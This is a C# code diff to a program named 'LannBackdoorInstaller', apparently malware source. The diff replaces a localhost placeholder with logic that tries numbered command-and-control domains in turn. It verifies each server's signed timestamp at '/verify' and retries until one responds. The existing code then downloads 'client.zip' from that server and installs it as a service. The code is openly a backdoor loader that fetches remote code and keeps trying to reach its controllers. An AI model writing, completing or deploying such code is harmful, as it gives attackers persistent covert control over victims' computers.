@@ -3,8 +3,10 @@ using System.IO.Compression;
 using System.Security.Principal;
 using System.Text;
 using LannLogger;
+using LBIJson;
 using Serilog.Core;
-using Utilities;
+using SystemModule;
+using InstallerUtils;
 using Constants = LannConstants.Constants;
 
 namespace LannBackdoorInstaller;
@@ -13,11 +15,13 @@ namespace LannBackdoorInstaller;
 
 public static class LBLoader {
     private static Logger Logger = LoggerFactory.CreateLogger("LannBackdoorInstaller");
+
     private static readonly bool IsAdministrator = new WindowsPrincipal(WindowsIdentity.GetCurrent())
         .IsInRole(WindowsBuiltInRole.Administrator);
 
     private static string URL;
-    
+    private static int serverId;
+
     public static async Task Main(string[] args) {
         Console.OutputEncoding = Encoding.UTF8;
         if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
@@ -29,18 +33,36 @@ public static class LBLoader {
 
         Logger.Information("Retrieving URL...");
         URL = await RetrieveUrl();
-        
-        Logger.Information("Target URL: {URL}", URL);
+        Logger.Information("Found valid URL: {Url}", URL);
 
         Logger.Information("Installing...");
         await Install();
-            
+
         Logger.Information("Installation success, service started.");
     }
 
     private static async Task<string> RetrieveUrl() {
-        Logger.Warning("TODO: {0}", "Retrieve URL");
-        return "http://localhost:2022";
+        string url = "http://" + Constants.Domain.Replace("{0}", (++serverId).ToString());
+        try {
+            VerifyHTTPResponse response = await WebUtils.DownloadJson<VerifyHTTPResponse>(url + "/verify");
+            long timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+            long diff = Math.Abs(response.TimeStamp - timestamp);
+            if (diff > 1000 * 15) {
+                Logger.Error("Too big time difference {Diff} for server {Id}", diff, serverId);
+                throw new Exception();
+            }
+
+            if (!Signing.VerifySigned(response.TimeStamp.ToString(), response.Signature)) {
+                Logger.Error("Wrong signature for server {Id}", serverId);
+                throw new Exception();
+            }
+        } catch (Exception error) {
+            Logger.Error("Failed to retrieve url for server {Id}: {Error}", serverId, error);
+            await Task.Delay(2000);
+            return await RetrieveUrl();
+        }
+
+        return url;
     }
 
     private static async Task Uninstall() {
@@ -69,6 +91,7 @@ public static class LBLoader {
         using HttpClient client = new();
         using HttpResponseMessage message = await client.GetAsync(URL + "/client.zip");
         await using Stream stream = await message.Content.ReadAsStreamAsync();
+        ;
         ZipArchive archive = new(stream);
 
         string path = Constants.InstallPath;
